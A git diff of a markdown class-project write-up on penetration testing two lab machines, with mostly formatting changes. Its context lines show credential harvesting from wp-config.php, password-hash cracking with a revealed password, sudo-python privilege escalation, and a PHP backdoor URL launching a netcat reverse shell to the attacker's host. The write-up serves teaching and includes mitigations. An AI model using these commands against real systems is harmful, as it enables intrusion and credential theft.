@@ -54,6 +54,7 @@ Another open port from the nmap scan back at the beginning was 22, or ssh. It tu
 `ssh Michael@192.168.1.110`
 
 Once logged in, looking around a little found Flag2 inside the `/var/www` directory. Looking a little further found a useful config file, `wp-config.php` located at `/var/www/html/wordpress`
+
 ![WP Config](/images/class-projects/final/wpconfig.png)
 
 Inside the configuration was were the credentials for a MySQL database.
@@ -65,6 +66,7 @@ Inside the mySQL database using
 Displayed the wordpress tables and then
 ` select * from wp_users;`
 revealed both Michael and Steven's password hashes.
+
 ![hashes](/images/class-projects/final/hashes.png)
 
 The database also contained Flag3.
@@ -72,20 +74,27 @@ The database also contained Flag3.
 #### John the ripper
 By exporting the two hashes from the database into a text file, John the Ripper was able to crack one of the two hashes. This gave Steven's password, pink84.
 `john hashes.txt`
+
 ![John the Ripper](/images/class-projects/final/john.png)
+
 ![John Results](/images/class-projects/final/john_results.png)
 
 #### Privilege Escalation
 After switching users to Steven, I checked his sudo access.
 `sudo -l`
+
 ![sudo access](/images/class-projects/final/sudo.png)
+
 and saw that he has sudo access for python. That's certainly an issue considering python can execute commands including things like creatinga new bash shell.
 
 After writing a quick little privilege escalations script
+
 ![Privesc.py](/images/class-projects/final/privesc.png)
+
 I ran that script as root
 `sudo python privesc.py`
 which created a new shell as root.
+
 ![root](/images/class-projects/final/root.png)
 
 Flag4 was inside root's home directory, and was the final objective for Target1.
@@ -95,6 +104,7 @@ This goal on this machine was only to gain user access, although it did take a l
 
 #### Reconassiance
 This machine started off similarly with a nmap scan `nmap -sV 162.168.1.115` and then running DirBuster.
+
 ![DirBuster](/images/class-projects/final/dirbuster2.png)
 
 This revealed the directory `192.168.1.115/vendor/PATH` which contained Flag1.
@@ -110,11 +120,14 @@ First, netcat was used to start a listener. `nc -lnvp 4444` and then the php com
 `192.198.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
 
 That connection immediately revealed Flag2
+
 ![Flag2](/images/class-projects/final/flag2.png)
 
 Flag3 was located with a find command
-`find /var/www -type f -iname 'flag*'
+`find /var/www -type f -iname 'flag*`
+
 ![flag3](/images/class-project/final/flag3.png)
+
 as a png image, which was view in a web browser
 `192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
 
@@ -164,7 +177,9 @@ In addition to the vulnerabilities that were used to exploit the machines in the
 
 #### Updating Apache
 Both target machines were running Apache 2.4.10 which contained known vulnerabilities, including CVE-2017-3167
-![CVE-201703167](/images/class-projects/final/apache.png)
+
+<img src="/images/class-projects/final/apache.png" alt="CVE-201703167" height="200%"/>
+
 The vulnerability was patched in versions 2.2.33 and 2.4.26, and updating to the newest apache version mitigates the vulnerability. At the time of the project the latest version of apache was 2.4.46.
 *Mitigation* `sudo apt install apache 2.4`
 
